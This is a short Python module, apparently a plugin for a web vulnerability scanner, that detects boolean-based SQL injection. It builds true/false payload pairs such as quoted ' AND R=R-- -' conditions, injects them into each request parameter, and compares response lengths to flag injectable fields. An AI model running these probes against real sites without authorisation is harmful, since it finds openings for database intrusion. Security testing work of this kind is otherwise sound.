import re, itertools, random
from utils.requester import *
from threading import Thread, Semaphore
from config import *


tech = "Bool Based SQL Injection"
prefixs = ("'", "\"", "",)
boolean = {1: " AND %d=%d", 0: " AND %d=%d+1"}
suffixs = ("-- -", "#",)
payloads = []
for pre, suf in itertools.product(prefixs, suffixs):
    R = random.randint(10000, 99999)
    payloads.append({
        1: f"{pre}{boolean[1]}{suf}" % (R, R),
        0: f"{pre}{boolean[0]}{suf}" % (R, R)
    })

def exec(data):
    for pos, payload in itertools.product(POSITIONS, payloads):
        for parameter in data[pos].keys():
            r1, r0 = bool_request(data, pos, parameter, payload)
            if (r1.status_code == r0.status_code) and (len(r1.text) != len(r0.text)): # todo://完善逻辑
                print(f"■■■{tech}■■■{pos}■■■{parameter}■■■{payload[1]}■■■")
                return True